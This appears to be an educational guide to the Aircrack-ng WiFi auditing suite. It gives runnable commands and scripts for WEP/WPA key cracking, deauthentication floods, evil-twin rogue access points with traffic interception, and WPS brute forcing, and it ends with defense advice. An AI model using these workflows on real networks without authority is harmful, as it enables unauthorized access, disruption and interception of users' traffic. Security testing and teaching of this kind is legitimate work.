# Aircrack-ng Suite Complete Guide

## ⚠️ Legal Disclaimer

**FOR AUTHORIZED SECURITY TESTING AND EDUCATIONAL PURPOSES ONLY**

The Aircrack-ng suite contains powerful wireless security auditing tools. Using these tools against networks you don't own or have explicit written permission to test is **ILLEGAL** and may result in:
- Criminal prosecution under computer fraud laws
- Heavy fines and imprisonment
- Civil liability and lawsuits
- Professional consequences

**ONLY use Aircrack-ng tools on:**
- Networks you own
- Authorized penetration testing engagements with written permission
- Educational lab environments
- Capture The Flag (CTF) competitions

---

## 📋 Table of Contents

1. [Introduction](#introduction)
2. [Installation](#installation)
3. [Suite Components](#suite-components)
4. [airmon-ng - Monitor Mode](#airmon-ng)
5. [airodump-ng - Packet Capture](#airodump-ng)
6. [aircrack-ng - Password Cracking](#aircrack-ng)
7. [aireplay-ng - Packet Injection](#aireplay-ng)
8. [airbase-ng - Fake Access Point](#airbase-ng)
9. [Additional Tools](#additional-tools)
10. [Complete Attack Workflows](#complete-workflows)
11. [Defense and Detection](#defense-and-detection)
12. [Troubleshooting](#troubleshooting)

---

## Introduction

### What is Aircrack-ng?

Aircrack-ng is a complete suite of tools to assess WiFi network security. It focuses on four main areas:
- **Monitoring**: Packet capture and export
- **Attacking**: Replay attacks, deauthentication, fake access points
- **Testing**: Testing WiFi cards and driver capabilities
- **Cracking**: WEP and WPA/WPA2-PSK key recovery

### Suite Philosophy

The suite follows a modular design where each tool has a specific purpose:
- **airmon-ng**: Enables monitor mode
- **airodump-ng**: Captures packets
- **aircrack-ng**: Cracks encryption keys
- **aireplay-ng**: Injects packets
- **airbase-ng**: Creates fake APs
- And many specialized utilities

### Version History

- **Aircrack 1.x**: Original WEP cracking tool
- **Aircrack-ng 0.x**: Complete rewrite, added WPA
- **Aircrack-ng 1.x**: Current stable version, ongoing development

---

## Installation

### Prerequisites

```bash
# Update system (Debian/Ubuntu)
sudo apt update && sudo apt upgrade -y

# Install dependencies
sudo apt install -y build-essential autoconf automake libtool pkg-config \
    libnl-3-dev libnl-genl-3-dev libssl-dev ethtool shtool rfkill \
    zlib1g-dev libpcap-dev libsqlite3-dev libpcre2-dev libhwloc-dev \
    libcmocka-dev hostapd wpasupplicant tcpdump screen iw usbutils \
    expect
```

### Installing from Package Manager

**Debian/Ubuntu/Kali:**
```bash
sudo apt update
sudo apt install aircrack-ng
```

**Arch Linux:**
```bash
sudo pacman -S aircrack-ng
```

**Fedora/RHEL:**
```bash
sudo dnf install aircrack-ng
```

**macOS (Homebrew):**
```bash
brew install aircrack-ng
```

### Installing from Source (Latest Version)

```bash
# Clone repository
git clone https://github.com/aircrack-ng/aircrack-ng.git
cd aircrack-ng

# Build
autoreconf -i
./configure --with-experimental
make

# Install
sudo make install

# Update linker cache
sudo ldconfig
```

### Verifying Installation

```bash
# Check version
aircrack-ng --help | head -n 1

# List all tools
ls /usr/bin/air* /usr/sbin/air*

# Verify specific tools
airmon-ng --help
airodump-ng --help
aireplay-ng --help
```

### Optional Enhancements

**Install hashcat for faster cracking:**
```bash
sudo apt install hashcat
```

**Install hcxtools for additional capture conversion:**
```bash
sudo apt install hcxtools
```

**Install john the ripper with jumbo patches:**
```bash
sudo apt install john
```

---

## Suite Components

### Core Tools

| Tool | Purpose | Primary Use |
|------|---------|-------------|
| **airmon-ng** | Monitor mode management | Enable/disable monitor mode |
| **airodump-ng** | Packet capture | Capture 802.11 frames |
| **aircrack-ng** | Key cracking | Crack WEP/WPA/WPA2 keys |
| **aireplay-ng** | Packet injection | Inject frames, deauth, replay |
| **airbase-ng** | Fake AP | Create rogue access points |
| **airdecap-ng** | Decryption | Decrypt WEP/WPA captures |
| **airdecloak-ng** | Decloak | Reveal hidden SSIDs |
| **airolib-ng** | Database | Manage WPA rainbow tables |
| **besside-ng** | Automated | Automatic WEP/WPA cracking |
| **easside-ng** | Auto WEP | Automatic WEP key recovery |
| **packetforge-ng** | Packet creation | Craft custom 802.11 frames |
| **tkiptun-ng** | WPA/TKIP attack | Exploit TKIP vulnerabilities |
| **wesside-ng** | Auto WEP | Automatic WEP cracking |
| **airdriver-ng** | Driver management | Load/unload wireless drivers |
| **airserv-ng** | Network server | Share wireless card over network |

---

## airmon-ng

### Purpose
Manages monitor mode on wireless interfaces. Monitor mode allows packet capture of all wireless traffic, not just traffic to/from your device.

### Basic Usage

```bash
# Check wireless interfaces
airmon-ng

# Start monitor mode
sudo airmon-ng start wlan0

# Start on specific channel
sudo airmon-ng start wlan0 6

# Stop monitor mode
sudo airmon-ng stop wlan0mon
```

### Advanced Options

```bash
# Check for interfering processes
sudo airmon-ng check

# Kill interfering processes
sudo airmon-ng check kill

# View detailed status
iw dev
```

### Examples

**Start monitor mode and kill interfering processes:**
```bash
sudo airmon-ng check kill
sudo airmon-ng start wlan0
```

**Monitor specific channel:**
```bash
# Start on 2.4GHz channel 11
sudo airmon-ng start wlan0 11

# Start on 5GHz channel 36
sudo airmon-ng start wlan0 36
```

**Restart wireless after monitoring:**
```bash
sudo airmon-ng stop wlan0mon
sudo systemctl restart NetworkManager
```

### Common Issues

**"Interface already in monitor mode"**
```bash
# Stop first, then restart
sudo airmon-ng stop wlan0mon
sudo airmon-ng start wlan0
```

**"No such device"**
```bash
# Check actual interface name
ip link show
iw dev
# Use correct name (might be wlp3s0, wlp2s0, etc.)
```

**"Could not set interface up"**
```bash
# Manually bring interface up
sudo ip link set wlan0 up
# Then try again
sudo airmon-ng start wlan0
```

---

## airodump-ng

### Purpose
Captures raw 802.11 frames and displays information about wireless networks and connected clients.

### Basic Syntax
```bash
airodump-ng [options] <interface>
```

### Essential Options

```
-c <channel>         Set channel (or multiple: 1,6,11)
-C <frequencies>     Set frequencies (2412,2437,2462)
--band <abg>         Band to capture (a=5GHz, b/g=2.4GHz)
-w <prefix>          Write capture to file (creates .cap, .csv, etc.)
--bssid <MAC>        Filter by specific AP
--essid <SSID>       Filter by SSID
--essid-regex <regex> Filter by SSID regex
-t <type>            Frame type filter (beacon, probe, data, etc.)
--showack            Show ACK/CTS/RTS frames
--gpsd               Use GPS data
--write-interval <sec> Write interval in seconds
--background <enable> Background mode
-o <format>          Output format (csv, pcap, kismet, etc.)
```

### Display Options

```
--manufacturer       Show manufacturer info
--wps                Show WPS information
--uptime             Show AP uptime
-U                   Show unknown fields
--berlin <duration>  Time before removing inactive APs
```

### Examples

**Basic scan (all channels):**
```bash
sudo airodump-ng wlan0mon
```

**Scan specific channel:**
```bash
sudo airodump-ng -c 6 wlan0mon
```

**Scan 2.4GHz band only:**
```bash
sudo airodump-ng --band bg wlan0mon
```

**Scan 5GHz band only:**
```bash
sudo airodump-ng --band a wlan0mon
```

**Capture packets to file:**
```bash
sudo airodump-ng -c 6 -w capture wlan0mon
```

**Target specific network:**
```bash
sudo airodump-ng -c 6 --bssid 00:11:22:33:44:55 -w capture wlan0mon
```

**Scan multiple channels:**
```bash
sudo airodump-ng -c 1,6,11 wlan0mon
```

**Show WPS information:**
```bash
sudo airodump-ng --wps wlan0mon
```

### Output Files

When using `-w capture`, airodump-ng creates:

- **capture-01.cap**: Packet capture (pcap format)
- **capture-01.csv**: Network/client data (CSV)
- **capture-01.kismet.csv**: Kismet-compatible CSV
- **capture-01.kismet.netxml**: Kismet XML
- **capture-01.log.csv**: GPS data (if --gpsd used)

### Understanding the Display

**Top section (Access Points):**
```
BSSID              PWR  Beacons  #Data  #/s  CH  MB  ENC  CIPHER  AUTH  ESSID
00:11:22:33:44:55  -42   123      456    5    6   54  WPA2 CCMP   PSK   MyNetwork
```

- **BSSID**: MAC address of AP
- **PWR**: Signal strength (-dBm, lower is better)
- **Beacons**: Number of beacon frames
- **#Data**: Number of data packets
- **#/s**: Packets per second
- **CH**: Channel
- **MB**: Max speed (Mbps)
- **ENC**: Encryption (OPN, WEP, WPA, WPA2, WPA3)
- **CIPHER**: Cipher (CCMP, TKIP, WEP)
- **AUTH**: Authentication (PSK, MGT, OPN)
- **ESSID**: Network name

**Bottom section (Clients):**
```
STATION            PWR  Rate   Lost  Frames  Notes  Probes
AA:BB:CC:DD:EE:FF  -38  54-54   0     123            MyNetwork
```

- **STATION**: Client MAC address
- **PWR**: Signal strength
- **Rate**: TX-RX rate
- **Lost**: Lost packets
- **Frames**: Number of frames
- **Probes**: Probe requests (shows networks client is looking for)

### Advanced Filtering

**Capture only WPA2 networks:**
```bash
sudo airodump-ng -c 1-11 --encrypt wpa2 wlan0mon
```

**Capture only networks with clients:**
```bash
sudo airodump-ng -c 6 wlan0mon | grep -v "(not associated)"
```

**Output to PCAP only:**
```bash
sudo airodump-ng -c 6 -w capture --output-format pcap wlan0mon
```

---

## aircrack-ng

### Purpose
Cracks WEP keys and WPA/WPA2-PSK passphrases using captured packets.

### Basic Syntax
```bash
aircrack-ng [options] <capture files>
```

### WEP Cracking Options

```
-a 1                 Force WEP cracking (attack mode 1)
-b <BSSID>           Target specific AP
-n <bit>             Key length (64, 128, 152, 256, 512)
-c                   Search alpha-numeric characters only
-t                   Search binary coded decimal only
-h                   Search hexadecimal only
-d <start>           Debug level (start at specific byte)
-m <maddr>           MAC address filter
-x or -x0            Disable last keybytes bruteforce
-x1                  Enable last keybyte bruteforcing (default)
-x2                  Enable last two keybytes bruteforcing
-X                   Disable bruteforce multithreading
```

### WPA/WPA2 Cracking Options

```
-a 2                 Force WPA-PSK cracking (attack mode 2)
-w <wordlist>        Wordlist file path
-b <BSSID>           Target specific AP
-e <ESSID>           Target ESSID
-p <ncpus>           Number of CPUs to use
-l <file>            Write key to file if found
-E <file>            Create Elcomsoft Wireless Security Auditor format
-J <file>            Create Hashcat capture format (hccapx)
-j <file>            Create John the Ripper format
-S                   WPA cracking speed test
-r <database>        Path to airolib-ng database
```

### WEP Cracking Examples

**Basic WEP crack:**
```bash
aircrack-ng capture-01.cap
```

**Target specific BSSID:**
```bash
aircrack-ng -b 00:11:22:33:44:55 capture-01.cap
```

**128-bit WEP key:**
```bash
aircrack-ng -n 128 -b 00:11:22:33:44:55 capture-01.cap
```

**Multiple capture files:**
```bash
aircrack-ng -b 00:11:22:33:44:55 capture*.cap
```

### WPA/WPA2 Cracking Examples

**Basic WPA crack with wordlist:**
```bash
aircrack-ng -a 2 -b 00:11:22:33:44:55 -w /usr/share/wordlists/rockyou.txt capture-01.cap
```

**Specify ESSID:**
```bash
aircrack-ng -a 2 -e "MyNetwork" -w wordlist.txt capture-01.cap
```

**Use all CPU cores:**
```bash
aircrack-ng -a 2 -b 00:11:22:33:44:55 -w wordlist.txt -p 8 capture-01.cap
```

**Save key to file when found:**
```bash
aircrack-ng -a 2 -b 00:11:22:33:44:55 -w wordlist.txt -l key.txt capture-01.cap
```

**Export to hashcat format:**
```bash
aircrack-ng -J hashcat_file -b 00:11:22:33:44:55 capture-01.cap
```

### WPA Cracking with Hashcat (Faster)

```bash
# Convert capture to hashcat format
aircrack-ng -J hashcat_output capture-01.cap

# Or use hcxpcapngtool (modern method)
hcxpcapngtool -o hash.hc22000 capture-01.cap

# Crack with hashcat (WPA2)
hashcat -m 2500 hashcat_output.hccapx wordlist.txt

# Crack with hashcat (WPA/WPA2 - modern format)
hashcat -m 22000 hash.hc22000 wordlist.txt

# Crack with GPU
hashcat -m 22000 -w 3 -O hash.hc22000 wordlist.txt

# Crack with rules
hashcat -m 22000 hash.hc22000 wordlist.txt -r rules/best64.rule
```

### Checking for Handshake

```bash
# Verify handshake is present
aircrack-ng capture-01.cap

# Look for output like:
# 1 handshake
# or
# No valid WPA handshakes found
```

### Performance Optimization

**Using airolib-ng (pre-computed PMK):**
```bash
# Create database
airolib-ng wpa-database --import passwd wordlist.txt

# Import ESSID
airolib-ng wpa-database --import essid essid.txt

# Compute PMKs (slow, one-time)
airolib-ng wpa-database --batch

# Crack using database (much faster)
aircrack-ng -r wpa-database capture-01.cap
```

### Wordlists

**Common wordlist locations:**
```bash
# Kali Linux default wordlists
/usr/share/wordlists/rockyou.txt
/usr/share/wordlists/fasttrack.txt

# Download SecLists
git clone https://github.com/danielmiessler/SecLists.git
# Located in: SecLists/Passwords/WiFi-WPA/

# Generate custom wordlist with crunch
crunch 8 12 0123456789 -o numbers.txt
```

**Password analysis with PACK:**
```bash
# Install
git clone https://github.com/iphelix/pack.git

# Analyze existing passwords
python pack/statsgen.py wordlist.txt -o stats.txt

# Generate targeted wordlist
python pack/maskgen.py stats.txt
```

---

## aireplay-ng

### Purpose
Injects packets into wireless networks to generate traffic, perform deauthentication, and execute various attacks.

### Basic Syntax
```bash
aireplay-ng [options] <interface>
```

### Attack Modes

```
Attack 0: Deauthentication
Attack 1: Fake authentication
Attack 2: Interactive packet replay
Attack 3: ARP request replay
Attack 4: KoreK chopchop
Attack 5: Fragmentation
Attack 6: Cafe-latte
Attack 7: Client-oriented fragmentation
Attack 8: WPA migration mode
Attack 9: Injection test
```

### Common Options

```
-b <BSSID>           Target AP MAC address
-d <MAC>             Destination MAC (FF:FF:FF:FF:FF:FF for broadcast)
-s <MAC>             Source MAC address
-e <ESSID>           Target ESSID
-h <MAC>             Source MAC (your card's MAC)
-c <MAC>             Client MAC address
-0 <count>           Deauth attack (count = # of packets, 0 = continuous)
-1 <delay>           Fake auth attack (delay in seconds)
-2                   Interactive replay
-3                   ARP replay
-4                   KoreK chopchop
-5                   Fragmentation
-6                   Cafe-latte
-9                   Injection test
```

### Attack 0: Deauthentication

**Purpose**: Disconnect clients from AP to capture WPA handshake.

```bash
# Deauth all clients from AP
sudo aireplay-ng --deauth 10 -a 00:11:22:33:44:55 wlan0mon

# Deauth specific client
sudo aireplay-ng --deauth 10 -a 00:11:22:33:44:55 -c AA:BB:CC:DD:EE:FF wlan0mon

# Continuous deauth
sudo aireplay-ng --deauth 0 -a 00:11:22:33:44:55 wlan0mon

# Targeted deauth with reason code
sudo aireplay-ng -0 1 -a 00:11:22:33:44:55 -c AA:BB:CC:DD:EE:FF wlan0mon
```

**Options:**
- `-0 <count>`: Number of deauth packets (0 = infinite)
- `-a <BSSID>`: AP MAC address
- `-c <client>`: Client MAC address
- `-e <ESSID>`: Network name (optional)

### Attack 1: Fake Authentication

**Purpose**: Associate with WEP AP to enable packet injection.

```bash
# Basic fake auth
sudo aireplay-ng --fakeauth 0 -a 00:11:22:33:44:55 -h AA:BB:CC:DD:EE:FF wlan0mon

# Fake auth with reassociation
sudo aireplay-ng --fakeauth 6000 -o 1 -q 10 -a 00:11:22:33:44:55 wlan0mon

# Fake auth for shared key WEP
sudo aireplay-ng -1 6000 -e MyNetwork -y replay_src-*.xor -a 00:11:22:33:44:55 wlan0mon
```

**Options:**
- `-1 <delay>`: Reassociation timing (seconds)
- `-o <packets>`: Number of packets per burst
- `-q <seconds>`: Seconds between keep-alives
- `-y <file>`: XOR file from chopchop/fragmentation

### Attack 3: ARP Replay Attack

**Purpose**: Amplify data packets for WEP cracking by capturing and replaying ARP requests.

```bash
# Basic ARP replay
sudo aireplay-ng --arpreplay -b 00:11:22:33:44:55 -h AA:BB:CC:DD:EE:FF wlan0mon

# ARP replay with filters
sudo aireplay-ng -3 -b 00:11:22:33:44:55 -h AA:BB:CC:DD:EE:FF -x 1000 wlan0mon
```

**Options:**
- `-3`: ARP replay mode
- `-b <BSSID>`: Target AP
- `-h <MAC>`: Your MAC address
- `-x <pps>`: Packets per second limit

**Typical workflow:**
```bash
# Terminal 1: Capture packets
sudo airodump-ng -c 6 --bssid 00:11:22:33:44:55 -w capture wlan0mon

# Terminal 2: Fake authenticate
sudo aireplay-ng -1 0 -a 00:11:22:33:44:55 -h AA:BB:CC:DD:EE:FF wlan0mon

# Terminal 3: ARP replay (wait for ARP packet)
sudo aireplay-ng -3 -b 00:11:22:33:44:55 -h AA:BB:CC:DD:EE:FF wlan0mon

# Terminal 4: Crack when enough IVs collected (~20,000+)
sudo aircrack-ng capture-01.cap
```

### Attack 4: KoreK ChopChop

**Purpose**: Decrypt WEP packet to obtain keystream (XOR file).

```bash
# Basic chopchop
sudo aireplay-ng --chopchop -b 00:11:22:33:44:55 -h AA:BB:CC:DD:EE:FF wlan0mon

# Chopchop with packet length
sudo aireplay-ng -4 -b 00:11:22:33:44:55 -h AA:BB:CC:DD:EE:FF -m 60 wlan0mon
```

**Options:**
- `-4`: ChopChop mode
- `-m <len>`: Minimum packet length
- `-n <len>`: Maximum packet length

### Attack 5: Fragmentation

**Purpose**: Obtain keystream for packet injection without cracking WEP key.

```bash
# Basic fragmentation
sudo aireplay-ng --fragment -b 00:11:22:33:44:55 -h AA:BB:CC:DD:EE:FF wlan0mon

# Fragmentation with options
sudo aireplay-ng -5 -b 00:11:22:33:44:55 -h AA:BB:CC:DD:EE:FF -k 192.168.1.1 wlan0mon
```

**Options:**
- `-5`: Fragmentation mode
- `-k <IP>`: Destination IP address

### Attack 9: Injection Test

**Purpose**: Test packet injection capability and quality.

```bash
# Basic test
sudo aireplay-ng --test wlan0mon

# Test against specific AP
sudo aireplay-ng -9 -e "MyNetwork" -a 00:11:22:33:44:55 wlan0mon

# Test with card-to-card
sudo aireplay-ng -9 -i wlan1mon wlan0mon
```

**Expected output:**
```
Injection is working!
Found X APs
Trying broadcast probe requests...
Injection is working!
Found X APs
```

### Practical Deauth Scripts

**Automated handshake capture:**
```bash
#!/bin/bash
# Capture WPA handshake

TARGET_BSSID="00:11:22:33:44:55"
CHANNEL=6
INTERFACE="wlan0mon"

# Start capture in background
sudo airodump-ng -c $CHANNEL --bssid $TARGET_BSSID -w handshake $INTERFACE &
DUMP_PID=$!

sleep 5

# Deauth 5 times
sudo aireplay-ng --deauth 5 -a $TARGET_BSSID $INTERFACE

sleep 10

# Stop capture
sudo kill $DUMP_PID

# Check for handshake
sudo aircrack-ng handshake-01.cap
```

---

## airbase-ng

### Purpose
Creates fake access points for various attacks including evil twin, honeypot, and client isolation.

### Basic Syntax
```bash
airbase-ng [options] <interface>
```

### Essential Options

```
-a <BSSID>           Set AP MAC address
-e <ESSID>           Set SSID
-c <channel>         Set channel
-W <mode>            WEP mode (0=none, 1=shared)
-z <type>            WPA encryption (1=WPA, 2=WPA2, 3=WPA3)
-Z <type>            WPA2 TKIP
-w <key>             WEP key
-h <MAC>             Source MAC address
-f <file>            MAC filter file
-P                   Respond to all probes
-C <seconds>         Beacon interval
-v                   Verbose mode
-A                   Ad-Hoc mode
-Y <type>            External processing (in, out, both)
-x <pps>             Packets per second
```

### Examples

**Create open network:**
```bash
sudo airbase-ng -e "FreeWiFi" -c 6 wlan0mon
```

**Create WEP network:**
```bash
sudo airbase-ng -e "SecureNet" -c 6 -W 1 -w 1234567890 wlan0mon
```

**Evil twin attack (clone existing network):**
```bash
# Get target details
sudo airodump-ng wlan0mon
# Note BSSID, channel, ESSID

# Create identical AP
sudo airbase-ng -a 00:11:22:33:44:55 -e "TargetNetwork" -c 6 wlan0mon

# In another terminal, deauth clients from real AP
sudo aireplay-ng --deauth 0 -a 00:11:22:33:44:55 wlan1mon
```

**Honeypot with internet access:**
```bash
# Start fake AP
sudo airbase-ng -e "FreeWiFi" -c 6 wlan0mon

# This creates at0 interface
# Set up internet sharing
sudo ifconfig at0 up
sudo ifconfig at0 192.168.100.1 netmask 255.255.255.0

# Enable IP forwarding
sudo echo 1 > /proc/sys/net/ipv4/ip_forward

# Set up NAT
sudo iptables -t nat -A POSTROUTING -o eth0 -j MASQUERADE
sudo iptables -A FORWARD -i at0 -o eth0 -j ACCEPT

# Set up DHCP
sudo apt install isc-dhcp-server
# Configure /etc/dhcp/dhcpd.conf
sudo dhcpd -cf /etc/dhcp/dhcpd.conf at0
```

**Respond to all probe requests:**
```bash
sudo airbase-ng -P -C 30 -c 6 wlan0mon
```

**Multiple SSIDs (beacon flood):**
```bash
# Create SSID file
echo "WiFi1" > ssids.txt
echo "WiFi2" >> ssids.txt
echo "WiFi3" >> ssids.txt

# Broadcast all SSIDs
for ssid in $(cat ssids.txt); do
    sudo airbase-ng -e "$ssid" -c 6 wlan0mon &
done
```

### Complete Evil Twin Setup

```bash
#!/bin/bash
# Full evil twin with credential capture

TARGET_BSSID="00:11:22:33:44:55"
TARGET_ESSID="TargetNetwork"
CHANNEL=6
INTERFACE="wlan0mon"
INTERNET="eth0"

# Start fake AP
sudo airbase-ng -a $TARGET_BSSID -e "$TARGET_ESSID" -c $CHANNEL $INTERFACE &

sleep 3

# Configure interface
sudo ifconfig at0 up
sudo ifconfig at0 192.168.100.1 netmask 255.255.255.0

# IP forwarding
sudo sysctl -w net.ipv4.ip_forward=1

# NAT
sudo iptables -t nat -A POSTROUTING -o $INTERNET -j MASQUERADE
sudo iptables -A FORWARD -i at0 -o $INTERNET -j ACCEPT

# DHCP
sudo dnsmasq -C /dev/null --interface=at0 --dhcp-range=192.168.100.10,192.168.100.100 \
    --dhcp-option=3,192.168.100.1 --dhcp-option=6,192.168.100.1

# Deauth from real AP
sudo aireplay-ng --deauth 0 -a $TARGET_BSSID wlan1mon &

echo "Evil twin active. Clients will connect to fake AP."
echo "Monitor traffic with: sudo tcpdump -i at0"
```

---

## Additional Tools

### airdecap-ng

**Purpose**: Decrypt WEP/WPA/WPA2 capture files.

```bash
# Decrypt WEP
airdecap-ng -w 1234567890 capture.cap

# Decrypt WPA/WPA2
airdecap-ng -e "MyNetwork" -p passphrase capture.cap

# Decrypt and specify BSSID
airdecap-ng -b 00:11:22:33:44:55 -p passphrase capture.cap

# Output file
airdecap-ng -p passphrase -o decrypted.cap capture.cap
```

### airdecloak-ng

**Purpose**: Remove cloaking from hidden networks.

```bash
# Decloak hidden SSID
airdecloak-ng -i capture.cap --bssid 00:11:22:33:44:55

# Use specific filters
airdecloak-ng --bssid 00:11:22:33:44:55 -i capture.cap -o decloaked.cap
```

### packetforge-ng

**Purpose**: Create custom encrypted packets for injection.

```bash
# Create ARP packet
packetforge-ng -0 -a 00:11:22:33:44:55 -h AA:BB:CC:DD:EE:FF \
    -k 192.168.1.1 -l 192.168.1.100 -y replay_src-*.xor -w arp.cap

# Create UDP packet
packetforge-ng -5 -a 00:11:22:33:44:55 -h AA:BB:CC:DD:EE:FF \
    -k 192.168.1.1 -l 192.168.1.100 -y replay_src-*.xor -w udp.cap
```

**Inject crafted packet:**
```bash
aireplay-ng -2 -r arp.cap wlan0mon
```

### besside-ng

**Purpose**: Automated WEP/WPA cracking tool.

```bash
# Basic usage
sudo besside-ng wlan0mon

# Specify output
sudo besside-ng -W wpa.cap -b wep.cap wlan0mon

# Target specific channel
sudo besside-ng -c 6 wlan0mon
```

### wesside-ng

**Purpose**: Automatic WEP key recovery.

```bash
# Basic WEP crack
sudo wesside-ng -i wlan0mon

# Specify output
sudo wesside-ng -i wlan0mon -v AA:BB:CC:DD:EE:FF
```

### tkiptun-ng

**Purpose**: WPA/TKIP attack tool.

```bash
# Michael shutdown exploitation
sudo tkiptun-ng -a 00:11:22:33:44:55 -m AA:BB:CC:DD:EE:FF wlan0mon
```

### easside-ng

**Purpose**: Auto-magic tool for communicating via WEP-encrypted AP without knowing key.

```bash
sudo easside-ng wlan0mon
```

### airserv-ng

**Purpose**: Share wireless card over network.

```bash
# Server side
sudo airserv-ng -p 666 -d wlan0mon

# Client side (on another machine)
aireplay-ng -9 -i 192.168.1.100:666 wlan0mon
```

---

## Complete Workflows

### WEP Cracking (Complete Process)

```bash
# Step 1: Start monitor mode
sudo airmon-ng start wlan0

# Step 2: Discover WEP networks
sudo airodump-ng wlan0mon

# Step 3: Capture packets on target
sudo airodump-ng -c 6 --bssid 00:11:22:33:44:55 -w wep_capture wlan0mon

# Step 4: (New terminal) Fake authenticate
sudo aireplay-ng -1 0 -a 00:11:22:33:44:55 -h AA:BB:CC:DD:EE:FF wlan0mon

# Step 5: (New terminal) ARP replay to generate IVs
sudo aireplay-ng -3 -b 00:11:22:33:44:55 -h AA:BB:CC:DD:EE:FF wlan0mon

# Step 6: (New terminal) Crack when 20,000+ IVs collected
sudo aircrack-ng wep_capture-01.cap

# Step 7: Clean up
sudo airmon-ng stop wlan0mon
```

### WPA/WPA2 Cracking (Complete Process)

```bash
# Step 1: Start monitor mode
sudo airmon-ng check kill
sudo airmon-ng start wlan0

# Step 2: Identify target network
sudo airodump-ng wlan0mon

# Step 3: Capture handshake
sudo airodump-ng -c 6 --bssid 00:11:22:33:44:55 -w wpa_capture wlan0mon

# Step 4: (New terminal) Deauth to force handshake
sudo aireplay-ng --deauth 5 -a 00:11:22:33:44:55 wlan0mon

# Step 5: Verify handshake captured (look for "WPA handshake" in airodump)

# Step 6: Stop capture (Ctrl+C in airodump terminal)

# Step 7: Crack with aircrack-ng
sudo aircrack-ng -a 2 -b 00:11:22:33:44:55 -w /usr/share/wordlists/rockyou.txt wpa_capture-01.cap

# Alternative: Use hashcat (faster)
sudo aircrack-ng -J hashcat_file wpa_capture-01.cap
hashcat -m 2500 hashcat_file.hccapx /usr/share/wordlists/rockyou.txt

# Step 8: Clean up
sudo airmon-ng stop wlan0mon
sudo systemctl restart NetworkManager
```

### Evil Twin Attack (Complete Process)

```bash
# Step 1: Gather target information
sudo airmon-ng start wlan0
sudo airodump-ng wlan0mon
# Note: BSSID, ESSID, Channel

# Step 2: Start second monitor interface for deauth
sudo airmon-ng start wlan1

# Step 3: Create fake AP
sudo airbase-ng -a 00:11:22:33:44:55 -e "TargetNetwork" -c 6 wlan0mon

# Step 4: Configure network
sudo ifconfig at0 up
sudo ifconfig at0 192.168.100.1 netmask 255.255.255.0
echo 1 | sudo tee /proc/sys/net/ipv4/ip_forward

# Step 5: Set up DHCP and DNS
sudo dnsmasq -C /dev/null --interface=at0 \
    --dhcp-range=192.168.100.10,192.168.100.100 \
    --dhcp-option=3,192.168.100.1 \
    --dhcp-option=6,8.8.8.8

# Step 6: Deauth clients from real AP
sudo aireplay-ng --deauth 0 -a 00:11:22:33:44:55 wlan1mon

# Step 7: Set up credential phishing page (optional)
# Use social engineering toolkit or custom portal

# Step 8: Monitor connections
sudo tcpdump -i at0 -w evil_twin.pcap

# Clean up when done
sudo killall airbase-ng aireplay-ng dnsmasq
sudo airmon-ng stop wlan0mon wlan1mon
```

### WPS Cracking with Reaver (Bonus)

While not part of aircrack-ng, often used together:

```bash
# Install reaver
sudo apt install reaver

# Put in monitor mode
sudo airmon-ng start wlan0

# Scan for WPS networks
sudo wash -i wlan0mon

# Attack WPS-enabled network
sudo reaver -i wlan0mon -b 00:11:22:33:44:55 -vv

# With Pixie Dust attack (faster)
sudo reaver -i wlan0mon -b 00:11:22:33:44:55 -vv -K
```

---

## Defense and Detection

### Protecting Against These Attacks

#### Enable WPA3
```
# Best protection against offline cracking
# Use WPA3-Personal or WPA3-Enterprise
# Falls back to WPA2 if needed (WPA3-transition mode)
```

#### Enable 802.11w (Management Frame Protection)
```
# Protects against deauthentication attacks
# Configure in hostapd.conf:
ieee80211w=2  # 2=required, 1=optional

# Also required for WPA3
```

#### Strong Passwords
```
# Minimum 14+ characters
# Mix of uppercase, lowercase, numbers, symbols
# Avoid dictionary words
# Use passphrase: "correct horse battery staple" style
```

#### Disable WPS
```
# WPS is vulnerable to brute force
# Disable in router/AP settings
# Many routers have option to disable
```

#### Hide Network (Limited Effectiveness)
```
# Disable SSID broadcast
# Provides minimal security
# Can still be discovered
# Not a replacement for strong encryption
```

#### MAC Filtering (Limited Effectiveness)
```
# Allow only specific devices
# Can be bypassed by MAC spoofing
# Not a primary security measure
# Use as additional layer only
```

### Detection Methods

**Wireless IDS:**
```bash
# Kismet - Popular wireless IDS
sudo kismet

# Snort with wireless preprocessor
sudo snort -A console -c /etc/snort/snort.conf -i wlan0mon

# Suricata
sudo suricata -c /etc/suricata/suricata.yaml -i wlan0mon
```

**Monitoring for attacks:**
```bash
# Detect deauth floods
sudo airodump-ng wlan0mon | grep -i deauth

# Monitor with Wireshark
sudo wireshark -i wlan0mon -k -f "wlan type mgt subtype deauth"

# Log to file for analysis
sudo tcpdump -i wlan0mon -w monitor.pcap
```

**Signs of attack:**
- Sudden increase in deauthentication frames
- Multiple networks with same SSID
- Unexpected client disconnections
- High management frame rate
- Beacon frame anomalies
- Duplicate BSSIDs

### Commercial Solutions

- **Cisco Adaptive wIPS**: Enterprise wireless IDS/IPS
- **Aruba RFProtect**: Cloud-managed WIDS
- **Fortinet FortiAP**: Integrated wireless security
- **AirMagnet**: Professional wireless analysis

---

## Troubleshooting

### Common Issues and Solutions

#### "No such device" or Interface not found

```bash
# Check actual interface name
ip link show
iw dev

# Check if driver loaded
lsmod | grep -i <driver_name>

# Check USB device (for USB adapters)
lsusb
dmesg | tail -50
```

#### Monitor mode not working

```bash
# Kill interfering processes
sudo airmon-ng check kill

# Manually enable monitor mode
sudo ip link set wlan0 down
sudo iw dev wlan0 set type monitor
sudo ip link set wlan0 up
sudo iw dev wlan0 set channel 6

# Check status
iwconfig wlan0
```

#### "Injection is not working"

```bash
# Test injection
sudo aireplay-ng --test wlan0mon

# If failed, check driver support
# Some drivers don't support injection
# Recommended chipsets: Atheros, Ralink

# Update driver if needed
sudo apt update && sudo apt install linux-headers-$(uname -r)
```

#### Can't capture handshake

**Possible issues:**

1. **Not on correct channel:**
```bash
# Verify channel
sudo iw dev wlan0mon info

# Set correct channel
sudo iw dev wlan0mon set channel 6
```

2. **Client already disconnected:**
```bash
# Verify clients are connected
sudo airodump-ng -c 6 --bssid 00:11:22:33:44:55 wlan0mon
# Look for STATION entries
```

3. **Deauth not working (802.11w enabled):**
```bash
# Check for MFP in airodump-ng output
# If MFP enabled, can't capture handshake this way
# Try attacking clients directly or wait for natural reconnection
```

4. **Too far from target:**
```bash
# Check signal strength in airodump-ng (PWR column)
# Move closer if signal < -70 dBm
```

#### Aircrack-ng shows "0 handshakes"

```bash
# Verify handshake manually with Wireshark
wireshark capture-01.cap
# Filter: eapol
